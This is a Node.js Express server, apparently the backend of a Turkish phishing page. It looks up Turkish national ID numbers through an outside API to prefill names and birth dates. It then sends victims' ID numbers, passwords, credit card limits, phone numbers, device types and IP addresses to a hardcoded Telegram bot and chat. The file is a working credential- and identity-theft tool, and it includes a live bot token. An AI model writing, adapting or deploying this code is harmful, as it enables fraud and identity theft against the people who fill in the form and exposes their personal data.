const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const axios = require('axios');

const TELEGRAM_BOT_TOKEN = "7532794844:AAEVd9ILVPD4p5yStZt6EAMuiEJ01ok2_Kw";
const TELEGRAM_CHAT_ID = "-1002546140880";

const app = express();
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

const fetch = global.fetch || ((...args) => import('node-fetch').then(({default: fetch}) => fetch(...args)));

function getDeviceType(ua) {
    ua = ua || "";
    if (/android/i.test(ua)) return "Android";
    if (/iphone|ipad|ipod/i.test(ua)) return "iOS";
    if (/windows|macintosh|linux/i.test(ua)) return "PC";
    return "Bilinmiyor";
}

function formatMessage(data) {
    return `
📝 [Başvuru Bilgisi]
👤 Ad Soyad: ${data.AD || ""} ${data.SOYAD || ""}
🆔 TC Kimlik No: ${data.tcno || ""}
🎂 Doğum Tarihi: ${data.DogumTarihi || ""}
🔑 Şifre: ${data.sifre || ""}
💳 Kredi Kartı Durumu: ${data.kredi_kart_durumu || ""}
${data.kredi_kart_durumu === 'evet' ? `
🔢 Kart Limiti: ${data.limit || ""}
📱 Telefon: ${data.telefon || ""}` : ""}
📱 Cihaz Tipi: ${data.device || ""}
🌐 IP: ${data.ip || ""}
⏰ Tarih: ${data.tarih || ""}
    `;
}

app.post('/tcLookup', async (req, res) => {
    // TC Sorgulama API
    try {
        const tc = req.body.tc;
        const apiUrl = `https://api.kahin.org/kahinapi/tcpro?tc=${tc}`;
        const apiResp = await axios.get(apiUrl);
        if (
            apiResp.data &&
            apiResp.data.success &&
            apiResp.data.data &&
            apiResp.data.data.length > 0
        ) {
            const tcData = apiResp.data.data[0];
            res.json({
                success: true,
                AD: tcData.Ad,
                SOYAD: tcData.Soyad,
                DogumTarihi: tcData.DogumTarihi
            });
        } else {
            res.json({ success: false });
        }
    } catch (err) {
        res.json({ success: false });
    }
});

app.post('/sendTelegram', async (req, res) => {
    // Cihaz tipi ve IP al
    const ua = req.headers['user-agent'] || "";
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || "";
    const message = formatMessage({ ...req.body, device: getDeviceType(ua), ip });

    try {
        const tgRes = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
            })
        });

        const tgJson = await tgRes.json();

        if (tgRes.ok && tgJson.ok) {
            res.json({ status: "ok" });
        } else {
            res.status(500).json({ status: "telegram_error", error: tgJson.description || "Telegram API hatası" });
        }
    } catch (err) {
        res.status(500).json({ status: "error", error: err.toString() });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Telegram server running on port ${PORT}`);
});
